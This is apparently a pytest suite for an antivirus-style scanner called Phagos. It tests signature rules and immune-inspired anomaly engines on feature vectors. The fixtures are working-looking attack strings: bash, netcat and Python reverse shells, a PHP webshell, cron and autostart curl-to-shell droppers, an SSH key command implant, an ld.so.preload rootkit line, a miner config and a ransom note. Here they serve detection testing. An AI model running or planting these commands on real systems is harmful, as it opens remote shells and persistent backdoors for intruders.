"""Phagos engines: in-house rules, Negative Selection, Clonal Selection, Dendritic Cells, heuristics.

Fixtures are harmless text that contains the patterns the rules look for; nothing here is runnable
malware.
"""
from __future__ import annotations

import random
from pathlib import Path

import pytest

from phagos import features as F
from phagos.engines import clonal, heuristics
from phagos.engines.dca import DendriticCells
from phagos.engines.nsa import NegativeSelection
from phagos.engines.rules import RuleError, RuleSet

RULES = Path(__file__).resolve().parents[2] / "phagos" / "rules"
EICAR = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*".encode()


@pytest.fixture(scope="module")
def rules():
    return RuleSet.load(RULES)


def names(rs, path, text):
    data = text.encode() if isinstance(text, str) else text
    return {h.rule for h in rs.scan(path, data, len(data))}


def test_rule_set_loads_and_catches_the_test_file(rules):
    import hashlib
    assert len(rules.rules) >= 10
    sha = hashlib.sha256(EICAR).hexdigest()
    assert rules.blocklist[sha] == "EICAR-Test-File"
    assert "EICAR-Test-File" in {h.rule for h in rules.scan("/home/u/Downloads/eicar.com", EICAR, len(EICAR), sha)}


@pytest.mark.parametrize("path, text, rule", [
    ("/tmp/x.sh", "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.8/4444 0>&1\n", "Linux.ReverseShell.Bash"),
    ("/tmp/x", "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.8 4444 > /tmp/f",
     "Linux.ReverseShell.Netcat"),
    ("/tmp/r.py", "import socket,os,pty\ns=socket.socket()\ns.connect(('10.0.0.8',4444))\n"
                  "os.dup2(s.fileno(),0)\npty.spawn('/bin/sh')\n", "Linux.ReverseShell.Script"),
    ("/home/u/.config/c.json", '{"algo": "rx/0", "donate-level": 1, "url": "stratum+tcp://pool.example.org:3333"}',
     "Miner.XMRig.Config"),
    ("/var/www/a.php", "<?php eval(base64_decode($_POST['x'])); ?>", "Webshell.PHP"),
    ("/etc/cron.d/update", "* * * * * root curl -s http://198.51.100.7/a.sh | sh\n", "Dropper.PipeToShell.Persistence"),
    ("/home/u/.config/autostart/x.desktop", "[Desktop Entry]\nExec=sh -c 'wget -q http://x.example/p -O- | bash'\n",
     "Dropper.PipeToShell.Persistence"),
    ("/home/u/Desktop/README.txt", "All your files have been encrypted. Send 0.1 bitcoin to this wallet to get the "
                                   "decryption key.", "Ransom.Note"),
    ("/etc/ld.so.preload", "/usr/lib/libhide.so\n", "Rootkit.LdPreload"),
    ("/home/u/.ssh/authorized_keys", 'command="curl http://x.example/k | sh" ssh-ed25519 AAAA u@h\n',
     "Implant.SSHKey.Command"),
    ("/tmp/s", "exec 5<>/dev/tcp/10.0.0.8/4444\ncat <&5 | while read line; do $line 2>&5 >&5; done\n",
     "Linux.ReverseShell.FdLoop"),
])
def test_rules_catch_each_threat(rules, path, text, rule):
    assert rule in names(rules, path, text)


@pytest.mark.parametrize("path, text", [
    ("/usr/share/doc/bash/README", "Bash can open network connections with /dev/tcp/host/port redirections."),
    ("/home/u/notes.txt", "To install, run: curl -fsSL https://example.org/install.sh | sh"),   # not a persistence spot
    ("/home/u/mining.md", "Notes on proof of work and the stratum protocol."),
    ("/etc/hosts", "127.0.0.1 localhost\n"),
    # AIRUX's own NEOX waits for Tor with a /dev/tcp port check: not a reverse shell
    ("/usr/bin/neox-private", "until (exec 3<>/dev/tcp/127.0.0.1/9050) 2>/dev/null; do sleep 0.5; done\n"),
    ("/home/u/report.txt", "The files were encrypted at rest with AES; key rotation is yearly."),
])
def test_rules_stay_quiet_on_ordinary_files(rules, path, text):
    assert names(rules, path, text) == set()


def test_bad_rules_are_refused(tmp_path):
    (tmp_path / "bad.toml").write_text('[[rule]]\nname = "X"\nseverity = "scary"\ntext = ["a"]\n')
    with pytest.raises(RuleError, match="severity"):
        RuleSet.load(tmp_path)
    (tmp_path / "bad.toml").write_text('[[rule]]\nname = "X"\nregex = ["("]\n')
    with pytest.raises(RuleError, match="bad pattern"):
        RuleSet.load(tmp_path)


# ---------------------------------------------------------------- immune engines on feature vectors
SYSTEM_ELF = [0.75, 0.55, 1, 0, 0, 1, 0, 0.35, 0, 0.3, 0, 1]
SCRIPT = [0.6, 0.35, 0, 1, 0, 0, 0, 1.0, 0, 0.1, 0, 1]
DOC = [0.55, 0.4, 0, 0, 0, 0, 0, 1.0, 0, 0.1, 0, 0]
DROPPER = [0.99, 0.5, 1, 0, 1, 1, 1, 0.1, 0.5, 0.6, 1, 1]      # packed static ELF in /tmp with net strings


def jitter(v, rng, s=0.03, n=40):
    return [[min(1, max(0, x + rng.gauss(0, s))) if 0 < x < 1 else x for x in v] for _ in range(n)]


def self_set(seed=1):
    rng = random.Random(seed)
    return jitter(SYSTEM_ELF, rng) + jitter(SCRIPT, rng) + jitter(DOC, rng)


def test_negative_selection_never_matches_self_and_flags_the_foreign():
    nsa = NegativeSelection(F.DIM, seed=7)
    nsa.add_self(self_set())
    assert nsa.train() > 0
    assert all(nsa.score(p)[0] == 0 for p in nsa.self_points)          # tolerance to self, by construction
    assert nsa.score(DROPPER)[0] > 0
    # round trip through JSON keeps the verdicts
    again = NegativeSelection.from_json(nsa.to_json())
    assert again.score(DROPPER)[0] == pytest.approx(nsa.score(DROPPER)[0], abs=1e-3)


def test_clonal_selection_learns_a_threat_and_catches_its_variant():
    nsa = NegativeSelection(F.DIM, seed=3)
    nsa.add_self(self_set())
    rng = random.Random(5)
    variant = [min(1, max(0, x + rng.uniform(-0.04, 0.04))) for x in DROPPER]
    assert nsa.score(variant) == (0.0, "")                              # no detectors yet: unseen
    mem = clonal.mature(nsa, DROPPER, "Dropper.Test", rng=random.Random(9))
    assert mem is not None and mem.memory == "Dropper.Test"
    s, name = nsa.score(variant)
    assert s > 0.3 and name == "Dropper.Test"
    assert all(nsa.score(p)[0] == 0 for p in nsa.self_points)          # clones passed negative selection
    # a "threat" that looks exactly like self cannot get a detector
    assert clonal.mature(nsa, SYSTEM_ELF, "Not.A.Threat", rng=random.Random(1)) is None


def test_allowing_a_file_makes_it_self():
    nsa = NegativeSelection(F.DIM, seed=7)
    nsa.add_self(self_set())
    nsa.train()
    assert nsa.score(DROPPER)[0] > 0
    nsa.tolerate(DROPPER)
    assert nsa.score(DROPPER)[0] == 0
    assert all(nsa.score(p)[0] == 0 for p in nsa.self_points)


def test_dendritic_cells_separate_damage_from_normal_work():
    dca = DendriticCells(seed=1)
    for _ in range(40):
        dca.sample("pid:editor", danger=0.5, safe=5)              # a text editor: steady, package-owned
        dca.sample("pid:ransom", danger=8, safe=0)                # mass encrypted rewrites of user files
        dca.sample("pid:miner", pamp=0, danger=4, safe=0.5)       # sustained CPU and connections
    assert dca.anomalous("pid:ransom") and dca.anomalous("pid:miner")
    assert not dca.anomalous("pid:editor")
    assert dca.mcav("pid:ransom")[0] > 0.8 > 0.2 > dca.mcav("pid:editor")[0]


def test_a_short_burst_followed_by_normal_work_is_not_an_attack():
    dca = DendriticCells(seed=2)
    for _ in range(3):
        dca.sample("pid:build", danger=6, safe=1)                 # a compiler writing many files
    for _ in range(60):
        dca.sample("pid:build", danger=0.5, safe=5)
    assert not dca.anomalous("pid:build")


def test_one_sure_sign_is_enough_to_tip_the_cells():
    dca = DendriticCells(seed=3)
    for _ in range(12):
        dca.sample("pid:x", pamp=6, danger=1, safe=1)             # wrote to a decoy file
    assert dca.anomalous("pid:x")


def test_heuristics_score_traits(tmp_path):
    p = tmp_path / "plain.txt"
    p.write_text("hello\n")
    assert heuristics.score(F.read(p))[0] == 0
    s = tmp_path / "dropper.sh"
    s.write_text("#!/bin/sh\ncurl -s http://198.51.100.7/x | sh\nchattr +i /etc/passwd\nhistory -c\nmkfifo /tmp/p\n")
    s.chmod(0o755)
    score, why = heuristics.score(F.read(s))
    assert score >= 0.5 and any("suspicious" in w for w in why)


def test_features_describe_a_file(tmp_path):
    p = tmp_path / "a.bin"
    p.write_bytes(bytes(range(256)) * 64)
    info = F.read(p)
    assert len(info.vector) == F.DIM and all(0 <= x <= 1 for x in info.vector)
    assert info.traits["entropy"] == pytest.approx(8.0)
    assert F.read(tmp_path) is None                                  # a folder is not a file
